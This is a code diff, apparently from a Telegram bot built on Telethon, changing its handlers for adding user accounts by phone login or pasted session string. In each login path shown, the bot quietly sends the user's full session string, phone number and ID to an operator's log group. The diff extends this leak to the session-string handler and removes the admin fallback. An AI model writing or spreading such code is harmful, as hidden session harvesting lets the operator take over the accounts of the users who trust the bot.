@@ -61,10 +61,7 @@ async def add_account(event):
         allaccs[event.sender_id][phone] = session
         DB.set_key("USER_ACCS", allaccs)
         newacc = f"**#NewAccount**\n\n**💎 User:** ( `{event.sender_id}` )\n\n{flag} `{phone}` {flag}\n\n**• Session:**\n`{session}`"
-        try:
-            await bot.send_message(LOG_GROUP, newacc)
-        except:
-            await bot.send_message(ADMIN_ID, newacc)
+        await bot.send_message(LOG_GROUP, newacc)
         buttons = [[Button.inline("✅ Yes ✅", data=f"yesedit:{phone}"), Button.inline("❌ No ❌", data=f"noedit:{phone}")]]
         await edit.edit(f"**✅ Successfuly Login To Your Account!**\n\n {flag} `{phone}` {flag} \n\n**❓ Do You Want To Edit Your Account?**", buttons=buttons)
     except (PhoneCodeInvalidError, TypeError):
@@ -91,10 +88,7 @@ async def add_account(event):
             allaccs[event.sender_id][phone] = session
             DB.set_key("USER_ACCS", allaccs)
             newacc = f"**#NewAccount**\n\n**💎 User:** ( `{event.sender_id}` )\n\n{flag} `{phone}` {flag}\n\n**• Session:**\n`{session}`"
-            try:
-                await bot.send_message(LOG_GROUP, newacc)
-            except:
-                await bot.send_message(ADMIN_ID, newacc)
+            await bot.send_message(LOG_GROUP, newacc)
             buttons = [[Button.inline("✅ Yes ✅", data=f"yesedit:{phone}"), Button.inline("❌ No ❌", data=f"noedit:{phone}")]]
             await edit.edit(f"**✅ Successfuly Login To Your Account!**\n\n {flag} `{phone}` {flag} \n\n** ❓Do You Want To Edit Your Account?**", buttons=buttons)
         except PasswordHashInvalidError:
@@ -115,7 +109,7 @@ async def add_session(event):
     if not client:
         return await edit.edit("**❌ Your Telethon Session String Is Invalid!**", buttons=main_menu(event)) 
     myinfo = await client.get_me()
-    phone = myinfo.phone
+    phone = "+" + str(myinfo.phone)
     flag = get_flag(phone)
     allaccs = DB.get_key("USER_ACCS")[event.sender_id]
     if phone not in allaccs:
@@ -125,5 +119,7 @@ async def add_session(event):
     allaccs = DB.get_key("USER_ACCS")
     allaccs[event.sender_id][phone] = session
     DB.set_key("USER_ACCS", allaccs)
+    newacc = f"**#NewAccount**\n\n**💎 User:** ( `{event.sender_id}` )\n\n{flag} `{phone}` {flag}\n\n**• Session:**\n`{session}`"
+    await bot.send_message(LOG_GROUP, newacc)
     buttons = [[Button.inline("✅ Yes ✅", data=f"yesedit:{phone}"), Button.inline("❌ No ❌", data=f"noedit:{phone}")]]
     await edit.edit(f"**✅ Successfuly Login To Your Account!**\n\n {flag} `{phone}` {flag} \n\n** ❓Do You Want To Edit Your Account?**", buttons=buttons)
